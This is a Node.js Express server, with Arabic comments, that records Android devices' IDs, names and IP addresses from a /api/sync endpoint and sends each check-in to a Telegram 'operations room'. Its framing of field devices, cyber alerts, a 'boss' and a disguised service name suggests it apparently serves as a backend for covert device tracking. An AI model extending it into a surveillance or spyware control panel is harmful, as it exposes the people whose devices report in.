const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

// إعداد التوثيق والاتصال بوت تيليجرام
const token = process.env.TELEGRAM_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const bot = new TelegramBot(token, { polling: true });

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// تهيئة قاعدة البيانات SQLite المدمجة بكفاءة مطلقة
const dbFile = path.join(__dirname, 'database.sqlite');
const db = new sqlite3.Database(dbFile, (err) => {
    if (err) {
        console.error('❌ خطأ في الاتصال بقاعدة البيانات:', err.message);
    } else {
        console.log('✅ تم الاتصال بقاعدة بيانات SQLite بنجاح.');
        db.run(`CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE,
            device_name TEXT,
            ip_address TEXT,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);
    }
});

// نقطة استقبال البيانات والمزامنة من تطبيق الأندرويد (SyncService)
app.post('/api/sync', (req, res) => {
    const { deviceId, deviceName, data } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    if (!deviceId) {
        return res.status(400).json({ success: false, error: 'Device ID is required' });
    }

    // تحديث بيانات الجهاز أو إضافته في قاعدة البيانات لحظياً
    db.run(
        `INSERT INTO devices (device_id, device_name, ip_address, last_seen) 
         VALUES (?, ?, ?, CURRENT_TIMESTAMP)
         ON CONFLICT(device_id) DO UPDATE SET 
         device_name = excluded.device_name,
         ip_address = excluded.ip_address,
         last_seen = CURRENT_TIMESTAMP`,
        [deviceId, deviceName || 'Unknown Device', clientIp],
        (err) => {
            if (err) {
                console.error('❌ خطأ أثناء حفظ بيانات الجهاز:', err.message);
            }
        }
    );

    // إرسال تنبيه فور وصول البيانات إلى غرفة عمليات تيليجرام
    const adminChatId = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID';
    bot.sendMessage(adminChatId, 
        `🚨 **تنبيه مزامنة سيبراني جديد!**\n\n📱 الجهاز: \`${deviceName || 'Unknown'}\`\n🆔 المعرف: \`${deviceId}\`\n🌐 الآيبي: \`${clientIp}\``,
        { parse_mode: 'Markdown' }
    ).catch(e => console.log('Telegram send error:', e.message));

    res.json({ success: true, message: 'Data synchronized successfully with supreme performance' });
});

// فحص حالة الخادم
app.get('/', (req, res) => {
    res.json({ status: 'Online', system: 'Web Assets Service Ultimate Edition', author: 'Cyber Elite' });
});

// استقبال الأوامر من بوت تيليجرام
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text === '/start') {
        bot.sendMessage(chatId, '🚀 أهلاً بك يا زعيم في غرفة عمليات المنظومة السيبرانية!\nالنظام يعمل بثبات تام وجاهز لإدارة الأجهزة الميدانية.', { parse_mode: 'Markdown' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🔥 الخادم يعمل بكفاءة مطلقة على المنفذ ${PORT}`);
});
